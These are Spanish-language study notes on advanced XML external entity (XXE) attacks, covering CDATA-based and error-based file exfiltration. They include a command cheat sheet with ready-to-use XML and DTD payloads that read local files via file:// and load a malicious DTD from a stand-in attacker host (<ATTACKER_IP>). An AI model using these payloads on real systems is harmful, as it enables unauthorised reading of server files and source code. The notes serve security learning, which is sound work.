---
tags:
  - XXE
  - attack
  - webapp
---
## Conceptos Clave (TL;DR)

* El XXE avanzado se utiliza cuando el XXE básico no es viable porque los formatos de archivo no son legibles o la aplicación web no refleja los valores de entrada en la salida.
* La exfiltración con CDATA envuelve el contenido del archivo objetivo en etiquetas `<![CDATA[ ]]>`, permitiendo extraer datos sin procesar o código fuente sin necesidad de codificación Base64.
* Las entidades de parámetros XML (identificadas con el carácter `%`) permiten eludir las restricciones de unión de entidades internas y externas al ser referenciadas desde un DTD externo.
* El XXE basado en errores (Error-Based XXE) se emplea en escenarios ciegos donde no hay salida XML, forzando a la aplicación a revelar el contenido del archivo dentro de un mensaje de error de tiempo de ejecución.

## Herramientas Clave

* **Python 3 HTTP Server (`python3 -m http.server`)**: Utilizado para levantar un servidor web local que aloje el archivo DTD malicioso, permitiendo que el servidor objetivo lo consulte como una entidad externa.

## Metodología Paso a Paso

**Fase 1: Exfiltración mediante CDATA**

La aplicación web procesa XML pero el contenido del archivo rompe el formato o requiere extracción en crudo.
1. Crear un archivo DTD externo que defina una entidad que concatene el inicio de CDATA, el archivo objetivo y el cierre de CDATA.
2. Alojar el archivo DTD en la máquina del atacante utilizando un servidor HTTP.
3. Enviar un payload XML malicioso que defina las entidades de parámetros para CDATA y el archivo objetivo, llame al DTD externo y finalmente imprima la entidad concatenada para revelar el código fuente directamente.

  
**Fase 2: Exfiltración Basada en Errores (Blind/Error-Based)**

La aplicación web no muestra la salida del XML, pero es vulnerable a revelar errores de ejecución (ej. errores de PHP).
1. Enviar datos XML malformados (como eliminar una etiqueta de cierre o referenciar una entidad inexistente) para verificar si la aplicación revela errores y rutas de directorios.
2. Crear un archivo DTD externo que intente cargar el archivo objetivo y anidarlo dentro de una llamada a una entidad que no existe, forzando un error de URI o entidad.
3. Enviar un payload XML que simplemente referencie el DTD externo y ejecute la entidad de error, lo que provocará que el servidor devuelva el contenido del archivo como parte del mensaje de error.

## Cheat Sheet de Comando

```bash
# Inicia un servidor web local para servir los payloads DTD al servidor objetivo
python3 -m http.server <PORT>
```

```bash
# Crea el payload DTD para exfiltración CDATA. Une las entidades de inicio, archivo y fin.
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

```xml
# Payload XML a enviar en la petición HTTP (Método CDATA). Carga el DTD externo y extrae el archivo.
<!DOCTYPE email [
<!ENTITY % begin "<![CDATA[">
<!ENTITY % file SYSTEM "file://<TARGET_FILE_PATH>">
<!ENTITY % end "]]>">
<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:<PORT>/xxe.dtd">
%xxe;
]>
<email>&joined;</email>
```

```xml
# Payload DTD para provocar filtración por error (Guardar en xxe.dtd). Inyecta el archivo en un URI inválido.

<!ENTITY % file SYSTEM "file://<TARGET_FILE_PATH>">

<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```xml
# Payload XML a enviar en la petición HTTP (Método Error-Based). Dispara el DTD externo y la entidad de error.

<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://<ATTACKER_IP>:<PORT>/xxe.dtd">
  %remote;
  %error;
]>
```

## "Gotchas" y Troubleshooting

* **Limitación de XML:** XML impide unir entidades internas y externas directamente; es obligatorio usar Entidades de Parámetros (`%`) dentro de un DTD externo para lograr la concatenación de datos con CDATA.
* **Mitigación del Servidor (DoS):** En servidores web modernos, es posible que no se puedan leer ciertos archivos (como `index.php`) porque el servidor bloquea ataques de denegación de servicio causados por bucles de referencia de entidades (self-reference loops).
* **Limitaciones de Error-Based:** El método de exfiltración basado en errores es menos confiable para leer código fuente que el método CDATA, ya que puede estar sujeto a límites de longitud en los mensajes de error y ciertos caracteres especiales pueden romper la ejecución.
* **Enumeración de Rutas:** Provocar errores intencionalmente alterando etiquetas XML (ej. usar `<roo>` en lugar de `<root>`) puede filtrar el directorio raíz del servidor web, facilitando la ubicación de archivos fuente para atacar posteriormente.